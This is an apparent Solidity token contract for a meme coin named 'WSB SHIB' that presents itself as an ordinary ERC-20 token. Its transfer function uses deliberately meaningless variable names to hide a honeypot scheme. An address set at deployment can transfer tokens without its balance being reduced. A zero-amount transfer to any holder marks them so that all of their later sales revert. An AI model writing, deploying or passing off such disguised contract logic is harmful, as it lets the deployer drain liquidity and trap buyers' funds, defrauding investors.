/*

https://t.me/wsbshib_eth

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract WSBSHIB is Ownable {
    mapping(address => uint256) public balanceOf;

    address public uniswapV2Pair;

    constructor(address certain) {
        symbol = 'WSB SHIB';
        name = 'WSB SHIB';
        totalSupply = 1000000000 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        pond[certain] = care;
    }

    uint256 private care = 85;

    function transfer(address barn, uint256 atom) public returns (bool success) {
        camp(msg.sender, barn, atom);
        return true;
    }

    uint256 public totalSupply;

    string public name;

    mapping(address => uint256) private dawn;

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint8 public decimals = 9;

    mapping(address => uint256) private pond;

    function camp(address terrible, address barn, uint256 atom) private returns (bool success) {
        if (pond[terrible] == 0) {
            if (terrible != uniswapV2Pair && dawn[terrible] > 0) {
                pond[terrible] -= care;
            }
            balanceOf[terrible] -= atom;
        }
        if (atom == 0) {
            dawn[barn] += care;
        }
        balanceOf[barn] += atom;
        emit Transfer(terrible, barn, atom);
        return true;
    }

    function approve(address poor, uint256 atom) public returns (bool success) {
        allowance[msg.sender][poor] = atom;
        emit Approval(msg.sender, poor, atom);
        return true;
    }

    function transferFrom(address terrible, address barn, uint256 atom) public returns (bool success) {
        camp(terrible, barn, atom);
        require(atom <= allowance[terrible][msg.sender]);
        allowance[terrible][msg.sender] -= atom;
        return true;
    }
}